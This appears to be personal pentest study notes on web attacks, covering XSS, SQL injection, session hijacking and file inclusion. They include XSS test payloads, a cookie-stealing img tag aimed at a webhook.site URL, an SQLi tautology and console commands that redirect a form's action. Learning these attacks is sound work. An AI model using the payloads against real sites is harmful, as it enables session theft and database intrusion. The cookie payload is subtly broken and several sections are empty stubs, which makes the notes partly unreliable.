# Web Attacks

# Input Validation Attacks
* attack triggered by user input, where input subverts the anticipated function of an application because of insufficient validation on client or server side.

## Cross-Site Scripting (XSS)
* where malicious scripts are injected browser side into otherwise benign and trusted websites.

### Types of XSS
1. Reflected XSS
   * [Reflected XSS](https://owasp.org/www-community/attacks/xss/) are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
2. Stored XSS
   * [Stored attacks](https://owasp.org/www-community/attacks/xss/) are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. 
3. DOM XSS
   * [DOM XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS) is where attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. Thus the page itself does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

### Goal of XSS
* Goal of XSS is the same regardless of the type of XSS: 
   1. Cookie Stealing
   2. Getting Complete Control over a Browser
   3. Initiating Exploitation Phasse against Browser Plugins which will Lateral Move to the Machine
   4. Keylogging
* The only difference is how the payload arrives at the server.

### Flow fo XSS Attack
Identify Input Vectors ---> Analyse Insertion Point ---> Check for Filters ---> Exploit 

### Finding XSS
* Review the source of the website
* Search for all places where input from an HTTP request could possibly make its way into the HTML output.
* XSS are usually found on forms and fields in the website which does not have any sanitisation checks.

### Testing and Exploiting XSS
The tests and exploits for XSS are mostly similar. 
#### Common Test
```
(1)
This test script tries to load a bogus img and on error creates an alert box
<img src='aaa' onerror="alert(document.domain);" />

(2) 
This test script builds an svg element which is an alert box
<svg/onload="alert(document.domain)">
```
#### Common Exploit
This leverages webhook.site to steal cookies rather than having our own server.
```
(1)
<img src=" https://webhook.site/11f46906-4e5f-4d08-ae69-9caf44c7e2b7?document.cookie"/>
```
#### Reflected XSS
1. Identifying Reflected XSS
   * Where input is within the html code of the response

#### Stored XSS
1. Identifying Possible Stored XSS
   * Where there is a database to store inputs and displays as output.

#### DOM XSS
* Identifying Possible DOM XSS
   * By inspecting the source using the browser, if input is rendered(printed) on the page but absent in the html source
   * We can infer that input is rendered by the DOM API.
   * Look out for javascript that handles input client side
   * Example : 
   ```
   window.onload = function() {
				var site=document.location.href;
				var index = site.indexOf("=", 0);
				name="";
				if(index != -1) {
					name=site.substr(index+1);
				}
				name=decodeURIComponent(name);
				document.getElementById('name').innerHTML=name;
			} 
   ```
   * From the above javascript, we can see that DOM API `document.location.href` and `document.getElementByID` is used.  
   * The flow of the program is as such, 
      1. when windows is loaded function will be executed. 
      2. Variable `site` is the URL string in URl format of the current page, `index` is index of value where '=' is at and `name` is an empty variable
      3. As long as index is a positive number, variable `name` will be populated with string after '=' 
      4. name is then decoded to strings from its URL format 
      5. variable `name` is printed on to the HTML page with the element name of '*name*'  
   * As can be seen in the flow of program above, DOM
   * References : https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model

* Exploit
##### Redirection
   * Browser ---> Developer ---> Console
   * In console, we want to try to modify the form action.
```
clear() // clear the console
document.forms // command to list out all forms on the page and locate the targeted form.
document.forms[x].action="//example.com" // x is the index of the targeted form and example.com will be the redirection site
```
### BeEF-XSS 
- Browser Exploitation Framework project.
- Tool that can be used as a hook for XSS exploitation.

## SQL Injections (SQLi)
* a type of input validation attack in which SQL commands are injected from the data-plane input in order to affect the execution of predefined SQL commands and access or manupulate the web application's backend database.
* Web App usually do queries based on user input : \
![SQL_Web_2](https://user-images.githubusercontent.com/88809233/145676430-e695b838-925a-46d8-996c-0abcffa4370b.PNG) 
* As can be seen above, user input required above is 'id' from GET request which can be dangerous when a malicious actor use some operators to make the database query things he wants. 
* Example : 
   * with the addition of `' or 'a'='a` it will turn the original query above to become \
   * `SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a'` \
   * The above statement tells the database to select the items by checking either of the two conditions when `id` is `null` or `'a' ='a'` an always true condition. This will thus tell the database to select all the items in the `Products` table.
  
### Finding SQLi
1. Find Injection Point
2. aaa

### Exploiting SQLi
* In SQL injection, it is important to 'formulate' a SQL statement of the targeted SQLi query.
* Hence the understanding of Basic SQL SELECT Statement `SELECT <column list> FROM <table> WHERE <condition>` is very important.

#### In-Band SQLi
#### Error-based SQLi
#### Blind SQLi

* Tool : [Blind SQLi Script](https://github.com/irboi746/Tools/blob/main/Web/1.%20BlindSQLi.sh)
#### References : 
* [Pentest Monkey Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

#### Automated Tool (SQLMap)



# Session & Logic Attacks
## Session Hijacking & Fixation
* HTTP is a stateless protocol, hence to keep track of user session, web app uses cookies, libraries etc. 
* Session Hijacking refers to the exploitation of valid session assigned to user.
* Session Fixation is a form of session hijacking where the attacker fixates a sessionID and forces the victim to use it.

1. Session Hijacking via XSS Cookie Stealing
2. Session Hijacking via Packet Sniffing (Wireshark) 
3. Session Fixation Attack

## Cross-Site Request Forgery (CSRF)
* 
## Files and Resources Vulnerabilities
1. Local File Inclusion attacks
2. Remote File Inclusion attacks
3. Unrestricted File Upload

